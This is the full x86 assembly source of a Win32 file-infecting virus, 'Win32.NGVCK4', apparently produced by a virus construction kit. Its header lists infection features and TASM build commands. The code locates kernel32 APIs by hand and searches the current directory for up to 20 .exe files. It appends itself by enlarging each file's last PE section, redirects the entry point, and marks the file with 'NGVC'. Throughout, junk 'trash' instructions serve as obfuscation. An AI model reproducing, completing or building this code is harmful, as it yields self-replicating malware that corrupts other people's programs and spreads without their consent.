              
;
;
; Win32.NGVCK4 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK4
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 36
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ebp
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, eax
 add esi, [eax+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov ecx, [esi]
 add esi, -60d
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], ecx
 call Align
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; clear esi
 mov esi, 0
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
 mov esi, ebx
                                        ; get last section
                                        ; clear ecx
 sub ecx, ecx
 mov cx, word ptr [esi+06h]
 add ecx, -1
 imul ecx, ecx, 28h
 add ebx, ecx
                                        ; add ebx, 120
 inc ebx
 add ebx, 119d
 mov ecx, dword ptr [esi+74h]
 shl ecx, 3
 add ebx, ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], eax
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov ecx, [ebx+10h]
                                        ; mov eax, ecx
 push ecx
 pop eax
 add ebx, 14h
 add ecx, [ebx]
 sub ebx, 14h
 push ecx
 mov edx, eax
 add edx, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 and dword ptr [ebp+Trash1], ebx        ; Trash
 add dword ptr [esi+28h], edx
                                        ; clear edx
 mov edx, 0

 add edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], edx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], edx
 pop edx
 add edx, VirusSize
 mov dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+10h]
 add edx, dword ptr [ebx+0Ch]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea ecx, [ebp+Virus]
 xchg esi, ecx

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 dec ebx
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi
 sub eax, 30293482d                     ; Trash

 mov ecx, dword ptr [ebp+OldBase]

 push ecx
 pop dword ptr [ebp+retBase]



                                        ; number of API's we're looking for
 mov edx, NumberOfApis

                                        ; load API Names and Offsets
 mov esi, offset APINames
 add esi, ebp

 lea ebx, [ebp+APIOffsets]


GetApisLoop: 

                                        ; clear ecx
 push 0
 pop ecx
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d

                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; esi points to the Name
                                        ; ebx points to the offset
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 call SearchAPI1
 push esi
 add dword ptr [esp], ecx
 pop esi
 and eax, 64508116d                     ; Trash
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+TempAPI]
 dec dword ptr [ebp+Trash1]             ; Trash
 mov dword ptr [ebx], -1
 and dword ptr [ebx], eax
                                        ; add ebx, 4
 add ebx, 4d
 sub edx, 1
 jnz GetApisLoop
 mov ecx, ebp
 add ecx, offset Outbreak

 push ecx
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 inc esp
 sub esp, 5d
                                        ; round to pages
 ror eax, 16d
 shl eax, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 mov ebx, dword ptr [ebp+K32Trys]
 cmp ebx, 0h
 jz NoKernel
                                        ; check for ZM
 movzx ecx, word ptr [eax]
 xor ecx, 'ZM'
 jz CheckPE

GK2:
 dec eax
 sub eax, 65535d
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add eax, 60
 inc eax
 add eax, 59d
 mov edi, [eax]
 dec eax
 sub eax, 59d
 neg eax
 sub edi, eax
 neg eax
                                        ; check for EP
 movzx ebx, word ptr [edi]
 xor ebx, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], eax
 mov dword ptr [ebp+KernelPE], edi

 lea edx, [ebp+GetApis]
 xchg edx, edi

 push edi
ret

;           [ ///// * Outbreak Procedure * \\\\\ ]

 sub dword ptr [ebp+Trash1], 1993908    ; Trash

Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 test ebx, ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop edi
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 push 0
 pop edx
 mov eax, dword ptr [ebp+AlignReg1]
 div ebx
                                        ; add eax, 1
 add eax, 1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:

 APIOffsets:
 XFindFirstFileA        dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XSetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h

 FileHandle  dd 0h
 K32Trys     dd 0h
 OldBase     dd 400000h
 Attributes  dd 0h

 APINames:
 db 14d, 'FindFirstFileA'
 db 18d, 'GetFileAttributesA'
 db 15d, 'UnmapViewOfFile'
 db 13d, 'MapViewOfFile'
 db 13d, 'FindNextFileA'
 db 11d, 'CreateFileA'
 db 09d, 'FindClose'
 db 18d, 'SetFileAttributesA'
 db 11d, 'CloseHandle'
 db 18d, 'CreateFileMappingA'

 NTableVA    dd 0h
 NewSize     dd 0h
 MapAddress  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 db 'Win32.NGVCK4 of SnakeByte',0
 AlignReg2   dd 0h
 TempAPI     dd 0h
 filemask    db '*.eXe',0
 MapHandle   dd 0h
 counter     dw 0h
 KernelMZ    dd 0h
 Trash1      dd 0h
 OldEIP      dd 0h
 FindHandle  dd 0h
 OTableVA    dd 0h
 AlignReg1   dd 0h
 InfCounter  dd 0h
 KernelPE    dd 0h
 NewEIP      dd 0h
 ATableVA    dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 mov edi, offset WFD_szFileName
 add edi, ebp

 push edi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop ebx
 or eax, eax
 jz CloseFile
 push ebx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 shr edx, 29d                           ; Trash
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov edx, ebx                           ; Trash
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov eax, offset WFD_szFileName
 add eax, ebp


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 add eax, -1
 add eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; mov eax, 22820
 push 22820d
 pop eax
 cmp eax, 0
 jne Notagoodfile
Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov eax, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 add eax, ecx
                                        ; check for PE Header
                                        ; check for EP
 movzx edx, word ptr [eax]
 xor edx, 'EP'
 jz Goodfile2
                                        ; mov ebx, 1139
 mov ebx, ( 1139d - 32d )
 add ebx, 32d
 cmp ebx, 1139d
 je Notagoodfile
 rcl edx, 29d                           ; Trash

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [eax+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov dx, word ptr [eax+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear edx
 mov edx, 27673d
 sub edx, 27673d
 xor edx, dword ptr [ebp+Attributes]
 push edx
 lea esi, [ebp+WFD_szFileName]
 xchg edx, esi

 push edx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad

 mov edi, dword ptr [ebp+KernelPE]
 inc eax                                ; Trash
                                        ; get Export-Table
                                        ; clear edx
 push 0
 pop edx
 add edx, [edi+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 dec edx
 add edx, 29d
                                        ; get ATableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; add edx, 4
 add edx, 4d
                                        ; get NTableVA
 mov edi, dword ptr [edx]
                                        ; add edx, 4
 inc edx
 add edx, 3d
 or eax, eax                            ; Trash
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi


 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; mov eax, edx
                                        ; clear eax
 sub eax, eax
 add eax, edx
                                        ; mov edi, eax
 push eax
 pop edi
 push ecx
 push edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bh, byte ptr [esi]
 cmp bh, byte ptr [edi]
 jne ApiNotFound
 add ecx, -1
 test ecx, ecx
 jz FoundApi1
                                        ; add edi, 1
 sub edi, -1d
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop edi
 pop ecx
 pop eax
                                        ; add eax, 4
 inc eax
 add eax, 3d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 16d
                                        ; retrieve the offset
                                        ; clear edx
 mov edx, 6429d
 sub edx, 6429d
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 add dword ptr [ebp+Trash1], ecx        ; Trash
 mov eax, edx
 movzx edx, word ptr [eax]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax

 push dword ptr [ebp+OldBase]
 or ebx, ebx                            ; Trash
 pop ecx

 mov dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 push edx
ret

 sbb eax, 18d                           ; Trash


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edi

 push edi
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ebx

                                        ; mov eax, 276
 mov eax, ( 276d xor 20d )
 xor eax, 20d

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 inc ebx
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 inc dword ptr [ebp+Trash1]             ; Trash
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA

 push esi
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret





CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 push 0
 pop ebx
 push ebx
 call ExitProcess



end FakeCode

